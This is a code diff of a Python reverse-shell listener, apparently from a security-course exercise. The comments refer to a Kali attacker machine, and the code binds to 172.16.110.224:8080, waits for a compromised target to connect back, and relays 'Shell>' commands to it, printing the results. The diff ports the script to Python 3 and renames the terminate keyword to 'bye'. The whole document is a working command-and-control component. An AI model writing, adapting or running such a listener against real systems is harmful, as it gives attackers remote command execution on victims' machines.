@@ -12,10 +12,13 @@ import socket # For Building TCP Connection
 def connect():
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # start a socket object 's'
+    host=socket.gethostname()
+    ip_adrr='172.16.110.224'
+    print(host,ip_adrr)
+    port=8080
+    s.bind((ip_adrr, port)) 
 
-    s.bind(("127.0.0.1", 8080)) # define the kali IP and the listening port
-
-    s.listen(1) # define the backlog size, since we are expecting a single connection from a single
+    s.listen(5) # define the backlog size, since we are expecting a single connection from a single
                                                             # target we will listen to one connection
 
     print ('[+] Listening for incoming TCP connection on port 8080')
@@ -25,19 +28,20 @@ def connect():
 
     print ('[+] We got a connection from: ', addr)
 
-
     while True:
 
-        command = raw_input("Shell> ") # Get user input and store it in command variable
+        command = (input("Shell> ")) # Get user input and store it in command variable
 
-        if 'terminate' in command: # If we got terminate command, inform the client and close the connect and break the loop
-            conn.send('terminate')
+        if ('bye' in (command)): # If we got terminate command, inform the client and close the connect and break the loop
+            conn.send(bytearray('bye', encoding='utf-8'))
             conn.close()
             break
 
         else:
-            conn.send(command) # Otherwise we will send the command to the target
-            print (conn.recv(1024)) # and print the result that we got back
+            conn.send(bytearray(command, encoding='utf-8')) # Otherwise we will send the command to the target
+            print(command)
+            print (conn.recv(1024).decode()) # and print the result that we got back
+           
 
 def main ():
     connect()
